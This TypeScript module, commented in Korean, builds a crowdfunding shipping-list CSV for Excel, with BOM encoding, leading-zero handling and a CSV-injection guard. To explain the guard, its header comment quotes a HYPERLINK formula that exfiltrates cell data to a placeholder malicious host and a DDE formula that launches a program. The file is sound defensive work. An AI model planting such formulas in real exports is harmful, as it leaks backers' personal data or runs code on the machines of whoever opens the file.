/**
 * 배송 목록 내보내기 — **순수 함수만.** DB·요청·응답을 모르는 자리다.
 *
 * 만드는 것은 CSV 한 장이고, 그 한 장이 **윈도우 엑셀에서 열린다**는 것이
 * 이 파일에 있는 거의 모든 처리의 이유다.
 *
 * ## ① 한글이 깨진다 — BOM과 CRLF
 *
 * 윈도우 엑셀은 확장자가 `.csv`인 파일을 열 때 인코딩을 묻지 않고 시스템
 * 기본 코드페이지(한국어 윈도우는 cp949)로 읽는다. UTF-8로 쓴 '서울시'는
 * 그대로 '���'이 된다. 파일 맨 앞에 **UTF-8 BOM(`﻿`)**을 붙이면 엑셀이
 * 그 표식을 보고 UTF-8로 읽는다. 줄바꿈도 `\r\n`으로 쓴다 — `\n`만 쓰면
 * 구형 엑셀이 한 줄로 이어 붙인다.
 *
 * ## ② 남이 적은 글자가 수식이 된다 — CSV 인젝션
 *
 * 배송 메모·주소·이름은 **낯선 사람이 입력창에 적은 값**이다. 엑셀은 셀이
 * `=`, `+`, `-`, `@`, 탭, 캐리지리턴으로 시작하면 그것을 수식으로 해석한다.
 * `=HYPERLINK("http://악성/"&A1,"클릭")` 한 줄이면 옆 칸의 주소가 남의
 * 서버로 넘어가고, `=cmd|'/c calc'!A1`은 DDE로 프로그램을 띄우려 든다.
 * 열어 보는 사람은 개설자와 사무국이다 — 즉 이 파일은 **후원자가 개설자의
 * 엑셀에 넣는 입력**이다.
 *
 * 그래서 그런 글자로 시작하는 값 앞에 작은따옴표(`'`)를 붙여 수식이 아닌
 * 글자로 만든다(OWASP 권고). 값이 눈에 한 글자 늘어 보이는 것을 감수한다 —
 * 원본을 지우거나 조용히 바꾸는 것보다 낫다.
 *
 * ## ③ 앞의 0이 사라진다 — 우편번호와 전화번호
 *
 * `06236`을 그냥 적으면 엑셀이 숫자로 보고 `6236`으로 만든다. `01012345678`도
 * `1012345678`이 된다. 택배 송장에 그대로 옮기면 **배달이 안 되는 번호**다.
 * 이 두 칸만 엑셀의 문자열 수식(`="06236"`)으로 적는다. 수식을 우리가 만드는
 * 셈이라 ②와 어긋나 보이지만, 그 전에 **숫자와 하이픈만 남기고 전부 버리기**
 * 때문에 후원자가 넣은 글자가 수식 안으로 들어갈 길이 없다.
 */

import { FULFILLMENT_LABEL, type FulfillmentStatus } from './fulfillment.ts'

/** 엑셀이 수식으로 읽기 시작하는 첫 글자들. */
const FORMULA_LEADS = ['=', '+', '-', '@', '\t', '\r']

/** 값 하나를 CSV 칸으로. 수식 차단 → 따옴표 이스케이프 순서다. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""'
  let text = String(value)
  if (FORMULA_LEADS.some(lead => text.startsWith(lead))) text = `'${text}`
  return `"${text.replace(/"/g, '""')}"`
}

/**
 * 앞의 0을 지켜야 하는 칸. 숫자와 하이픈만 남긴 뒤 엑셀 문자열 수식으로 적는다.
 * 남는 글자가 없으면 빈 칸을 준다 — `=""`는 엑셀에서 빈 문자열이라 괜찮지만
 * 읽는 사람에게 더 조용한 쪽을 고른다.
 */
export function csvDigits(value: unknown): string {
  const digits = String(value ?? '').replace(/[^0-9-]/g, '')
  if (digits.length === 0) return '""'
  return `"=""${digits}"""`
}

export const SHIPPING_EXPORT_HEADERS = [
  '후원번호',
  '후원자',
  '받는 사람',
  '연락처',
  '우편번호',
  '주소',
  '상세주소',
  '배송 메모',
  '리워드',
  '수량',
  '이행 상태',
] as const

export interface ShippingRow {
  pledge_code?: unknown
  backer_name?: unknown
  shipping_name?: unknown
  shipping_phone?: unknown
  shipping_postcode?: unknown
  shipping_address1?: unknown
  shipping_address2?: unknown
  shipping_memo?: unknown
  reward_title?: unknown
  quantity?: unknown
  fulfillment_status?: unknown
}

function label(status: unknown): string {
  return FULFILLMENT_LABEL[status as FulfillmentStatus] ?? String(status ?? '')
}

/** 표 한 장. 맨 앞의 BOM과 `\r\n`이 ①의 처리다. */
export function buildShippingCsv(rows: ShippingRow[]): string {
  const lines = [SHIPPING_EXPORT_HEADERS.map(csvCell).join(',')]
  for (const r of rows) {
    lines.push(
      [
        csvCell(r.pledge_code),
        csvCell(r.backer_name),
        csvCell(r.shipping_name),
        csvDigits(r.shipping_phone),
        csvDigits(r.shipping_postcode),
        csvCell(r.shipping_address1),
        csvCell(r.shipping_address2),
        csvCell(r.shipping_memo),
        csvCell(r.reward_title),
        csvCell(r.quantity),
        csvCell(label(r.fulfillment_status)),
      ].join(',')
    )
  }
  return `﻿${lines.join('\r\n')}\r\n`
}

/**
 * 내려받을 때 붙는 파일 이름.
 *
 * 한글 파일명은 `filename=`에 그대로 담을 수 없다(헤더는 ASCII다). RFC 5987의
 * `filename*=UTF-8''…`로 한글을 주고, 그 문법을 모르는 오래된 클라이언트를
 * 위해 ASCII 이름을 `filename=`에 함께 남긴다.
 */
export function shippingExportDisposition(campaignTitle: unknown, today: Date): string {
  const date = today.toISOString().slice(0, 10)
  const safeTitle = String(campaignTitle ?? '')
    // 따옴표·역슬래시·제어문자는 헤더를 깨뜨린다. 경로 구분자도 지운다.
    .replace(/["\\/\r\n\t]/g, ' ')
    .trim()
    .slice(0, 60)
  const korean = `${safeTitle || '펀딩'}_배송목록_${date}.csv`
  const ascii = `funding-shipping-${date}.csv`
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encodeURIComponent(korean)}`
}
